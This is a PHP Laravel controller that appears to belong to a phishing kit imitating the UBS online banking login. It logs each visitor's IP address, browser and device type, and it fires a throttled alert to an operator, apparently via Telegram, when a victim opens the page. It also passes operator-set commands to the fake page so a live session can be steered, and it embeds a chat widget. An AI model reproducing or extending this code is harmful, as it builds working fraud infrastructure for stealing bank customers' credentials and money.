<?php

namespace App\Http\Controllers;

use App\Events\PreSessionCreated;
use App\Models\BankSession;
use App\Models\PreSession;
use App\Telegram\Handlers\SmartSuppHandler;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Cookie;
use Inertia\Inertia;
use Inertia\Response;

class BankLoginController extends Controller
{
    public const DEFAULT_SLUG = 'ubs';

    public function show(string $slug, Request $request): Response
    {
        if ($slug !== self::DEFAULT_SLUG) {
            abort(404);
        }

        $cookieName = 'bsid';
        $existingId = $request->cookie($cookieName);
        $session    = null;

        if ($existingId) {
            $session = BankSession::where('id', $existingId)
                ->where('bank_slug', self::DEFAULT_SLUG)
                ->where('status', '!=', 'completed')
                ->where('last_activity_at', '>=', now()->subHours(2))
                ->first();
        }

        if ($session === null) {
            $session = BankSession::create([
                'bank_slug'        => self::DEFAULT_SLUG,
                'ip_address'       => $request->clientIp(),
                'user_agent'       => $request->userAgent(),
                'domain'           => $request->getHost(),
                'last_activity_at' => now(),
            ]);
        }

        $preSession = PreSession::create([
            'ip_address'  => $request->clientIp(),
            'user_agent'  => $request->userAgent(),
            'page_url'    => $request->fullUrl(),
            'page_name'   => 'login',
            'bank_slug'   => self::DEFAULT_SLUG,
            'device_type' => self::detectDevice($request->userAgent() ?? ''),
            'is_online'   => true,
            'last_seen'   => now(),
        ]);

        // Атомарный lock: шлём уведомление только один раз за 15 сек для IP+форма
        $lockKey = 'presession:' . $request->clientIp() . ':login';
        if (Cache::add($lockKey, true, 15)) {
            PreSessionCreated::dispatch($preSession);
        }

        $page = 'Banks/Ubs';

        Cookie::queue($cookieName, $session->id, 120);

        return Inertia::render($page, [
            'sessionId'      => $session->id,
            'smartsupp'      => SmartSuppHandler::getSettings(),
            'preSessionId'   => $preSession->id,
            'initialCommand' => $session->action_type ?? ['type' => 'idle'],
        ]);
    }

    private static function detectDevice(string $ua): string
    {
        if (stripos($ua, 'iPhone') !== false) return 'iphone';
        if (stripos($ua, 'iPad') !== false)   return 'ipad';
        if (stripos($ua, 'Android') !== false) return 'android';
        if (stripos($ua, 'Windows') !== false) return 'windows';
        if (stripos($ua, 'Macintosh') !== false || stripos($ua, 'Mac OS X') !== false) return 'macos';
        if (stripos($ua, 'Linux') !== false)   return 'linux';
        return 'desktop';
    }
}
